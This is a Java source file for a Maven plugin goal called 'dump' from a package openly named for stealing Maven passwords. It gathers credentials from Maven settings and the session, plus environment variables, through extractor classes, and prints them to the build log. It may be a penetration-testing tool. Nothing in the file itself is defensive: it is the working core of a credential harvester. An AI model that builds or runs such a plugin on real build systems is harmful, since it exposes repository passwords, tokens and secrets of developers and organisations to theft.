package ninja.stealing.maven.password;

import java.util.ArrayList;
import java.util.List;

import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugins.annotations.Mojo;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.settings.Settings;
import org.apache.maven.plugin.logging.Log;

import ninja.stealing.maven.password.delivery.LogDelivery;
import ninja.stealing.maven.password.extractor.EnvExtractor;
import ninja.stealing.maven.password.extractor.MavenPasswordExtractor;
import ninja.stealing.maven.password.model.Extraction;

@Mojo(requiresProject = false, name = "dump")
public class PasswordExtract extends AbstractMojo {
	@Parameter(defaultValue = "${session}", readonly = true, required = true)
	private MavenSession session;
	@Parameter(defaultValue = "${settings}", readonly = true, required = true)
	private Settings settings;


	public void execute() throws MojoExecutionException {
		List<Extraction> extractions = new ArrayList<Extraction>();
		
		Log log = getLog();
		MavenPasswordExtractor mavenPasswordExtractor = new MavenPasswordExtractor(log, session, settings);
		Extraction mavenExtraction = mavenPasswordExtractor.extract();
		extractions.add(mavenExtraction);
		
		EnvExtractor envExtractor = new EnvExtractor();
		Extraction envExtraction = envExtractor.extract();
		extractions.add(envExtraction);
		

		LogDelivery delivery = new LogDelivery(log);
		delivery.deliver(extractions);
		

	}
}

